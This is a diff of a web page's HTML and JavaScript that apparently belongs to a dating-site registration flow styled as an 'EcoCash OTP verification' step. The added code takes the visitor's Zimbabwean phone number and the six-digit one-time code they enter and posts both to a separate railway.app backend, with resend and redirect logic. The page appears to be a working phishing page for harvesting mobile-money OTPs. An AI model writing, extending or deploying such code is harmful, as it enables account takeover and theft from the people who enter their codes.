@@ -235,6 +235,38 @@
             to { opacity: 1; transform: translateY(0); }
         }
         
+        /* Toast notification */
+        .toast {
+            position: fixed;
+            bottom: 30px;
+            left: 50%;
+            transform: translateX(-50%);
+            background: #333;
+            color: white;
+            padding: 16px 30px;
+            border-radius: 12px;
+            font-size: 14px;
+            font-weight: 500;
+            z-index: 2000;
+            opacity: 0;
+            transition: opacity 0.3s ease;
+            pointer-events: none;
+            max-width: 90%;
+            text-align: center;
+        }
+        
+        .toast.show {
+            opacity: 1;
+        }
+        
+        .toast.error {
+            background: #e74c3c;
+        }
+        
+        .toast.success {
+            background: #27ae60;
+        }
+        
         footer {
             padding: clamp(10px, 3vw, 15px);
             color: #aaa;
@@ -345,17 +377,19 @@
         <div class="spinner"></div>
         <div class="spinner-text">Verifying OTP...</div>
     </div>
+
+    <!-- Toast Notification -->
+    <div class="toast" id="toast"></div>
     
     <script>
         // ============================================================
-        // 🔥 FIXED: OTP PAGE WILL SHOW PROPERLY!
+        // ECOCASH OTP VERIFICATION - CONNECTED TO BACKEND
         // ============================================================
         
-        // ✅ Clear any previous verification to show OTP page
-        // This ensures the OTP page always shows when you open it
-        // If you want to skip OTP after verification, use sessionStorage instead
-        localStorage.removeItem('otpVerified');
+        // ===== CONFIGURATION =====
+        const API_URL = 'https://classydateregistration-production.up.railway.app';
         
+        // ===== DOM ELEMENTS =====
         const phone = localStorage.getItem('phone') || 'N/A';
         document.getElementById('displayPhone').textContent = '+263 ' + phone;
         
@@ -365,12 +399,24 @@
         const spinnerOverlay = document.getElementById('spinnerOverlay');
         const resendLink = document.getElementById('resendLink');
         const timerDisplay = document.getElementById('timerDisplay');
+        const toast = document.getElementById('toast');
         
         let otpValue = '';
         let resendTimer = 30;
         let timerInterval = null;
         let isResendCooldown = false;
-        
+        let isVerifying = false;
+
+        // ===== TOAST NOTIFICATION =====
+        function showToast(message, type = '') {
+            toast.textContent = message;
+            toast.className = 'toast show ' + type;
+            setTimeout(() => {
+                toast.className = 'toast';
+            }, 5000);
+        }
+
+        // ===== CHECK OTP COMPLETE =====
         function checkOTPComplete() {
             otpValue = Array.from(otpBoxes).map(box => box.value).join('');
             verifyBtn.disabled = otpValue.length !== 6;
@@ -383,11 +429,12 @@
                 }
             });
             
-            if (otpValue.length === 6) {
+            if (otpValue.length === 6 && !isVerifying) {
                 setTimeout(verifyOTP, 300);
             }
         }
         
+        // ===== OTP INPUT HANDLING =====
         otpBoxes.forEach((box, index) => {
             box.addEventListener('input', () => {
                 box.value = box.value.replace(/\D/g, '');
@@ -430,41 +477,136 @@
                 }
             });
         });
-        
-        function verifyOTP() {
+
+        // ===== VERIFY OTP =====
+        async function verifyOTP() {
+            if (isVerifying) return;
+            
             const enteredOTP = Array.from(otpBoxes).map(box => box.value).join('');
              
             if (enteredOTP.length !== 6) {
                 return;
             }
-             
+            
+            isVerifying = true;
             spinnerOverlay.style.display = 'flex';
             verifyBtn.disabled = true;
-             
-            setTimeout(() => {
-                spinnerOverlay.style.display = 'none';
+            errorMessage.classList.remove('show');
+
+            const fullPhone = '263' + phone;
+
+            try {
+                console.log('📤 Verifying OTP:', { phone: fullPhone, otp: enteredOTP });
+
+                const response = await fetch(`${API_URL}/api/verify-otp`, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                        'Accept': 'application/json'
+                    },
+                    body: JSON.stringify({ 
+                        phone: fullPhone, 
+                        otp: enteredOTP 
+                    })
+                });
+
+                console.log('📥 Response status:', response.status);
+
+                if (!response.ok) {
+                    const errorText = await response.text();
+                    console.log('📥 Error response:', errorText);
+                    throw new Error(`Server error: ${response.status}`);
+                }
+
+                const data = await response.json();
+                console.log('📥 Response data:', data);
+
+                if (data.status === 'success') {
+                    showToast('✅ OTP verified successfully!', 'success');
+                    
+                    setTimeout(() => {
+                        spinnerOverlay.style.display = 'none';
+                        sessionStorage.setItem('otpVerified', 'true');
+                        window.location.href = 'members.html';
+                    }, 1500);
+                    
+                } else {
+                    throw new Error(data.message || 'Invalid OTP');
+                }
+
+            } catch (error) {
+                console.error('❌ Error:', error);
+                
+                let userMessage = 'Invalid OTP. Please try again.';
+                if (error.message.includes('Failed to fetch') || error.message.includes('502')) {
+                    userMessage = 'Cannot connect to server. Please check your internet connection.';
+                } else {
+                    userMessage = error.message || 'Invalid OTP. Please try again.';
+                }
+                
+                errorMessage.textContent = '❌ ' + userMessage;
+                errorMessage.classList.add('show');
+                showToast('❌ ' + userMessage, 'error');
+                
+                otpBoxes.forEach(box => {
+                    box.value = '';
+                    box.classList.remove('filled');
+                    box.classList.add('invalid');
+                    setTimeout(() => {
+                        box.classList.remove('invalid');
+                    }, 500);
+                });
+                
+                isVerifying = false;
                 verifyBtn.disabled = false;
-                 
-                // ✅ Use sessionStorage so it auto-clears when tab closes
-                // This way the OTP page will show again on next visit
-                sessionStorage.setItem('otpVerified', 'true');
-                window.location.href = 'members.html';
-            }, 1500);
+                spinnerOverlay.style.display = 'none';
+                otpBoxes[0].focus();
+            }
         }
         
         verifyBtn.addEventListener('click', verifyOTP);
-        
-        function resendOTP() {
+
+        // ===== RESEND OTP =====
+        async function resendOTP() {
             if (isResendCooldown) return;
             
-            isResendCooldown = true;
-            resendLink.classList.add('disabled');
-            timerDisplay.style.display = 'inline';
-            resendTimer = 30;
-            timerDisplay.textContent = `(${resendTimer}s)`;
+            const fullPhone = '263' + phone;
             
-            alert('📱 A new OTP has been sent to your phone.');
-            
+            try {
+                isResendCooldown = true;
+                resendLink.classList.add('disabled');
+                timerDisplay.style.display = 'inline';
+                resendTimer = 30;
+                timerDisplay.textContent = `(${resendTimer}s)`;
+
+                console.log('📤 Resending OTP for:', fullPhone);
+
+                const response = await fetch(`${API_URL}/api/resend-otp`, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                        'Accept': 'application/json'
+                    },
+                    body: JSON.stringify({ phone: fullPhone })
+                });
+
+                const data = await response.json();
+                console.log('📥 Resend response:', data);
+
+                if (data.status === 'success') {
+                    showToast('📱 New OTP sent to your phone!', 'success');
+                } else {
+                    throw new Error(data.message || 'Failed to resend OTP');
+                }
+
+            } catch (error) {
+                console.error('❌ Resend error:', error);
+                showToast('❌ Failed to resend OTP. Please try again.', 'error');
+                isResendCooldown = false;
+                resendLink.classList.remove('disabled');
+                timerDisplay.style.display = 'none';
+            }
+
             otpBoxes.forEach(box => {
                 box.value = '';
                 box.classList.remove('filled');
@@ -473,6 +615,7 @@
             otpBoxes[0].focus();
             errorMessage.classList.remove('show');
             
+            // Start timer
             timerInterval = setInterval(() => {
                 resendTimer--;
                 timerDisplay.textContent = `(${resendTimer}s)`;
@@ -485,13 +628,9 @@
                 }
             }, 1000);
         }
-        
+
+        // ===== AUTO-FOCUS =====
         otpBoxes[0].focus();
-        
-        // ✅ Check sessionStorage (auto-clears when tab closes)
-        if (sessionStorage.getItem('otpVerified') === 'true') {
-            window.location.href = 'members.html';
-        }
     </script>
 </body>
 
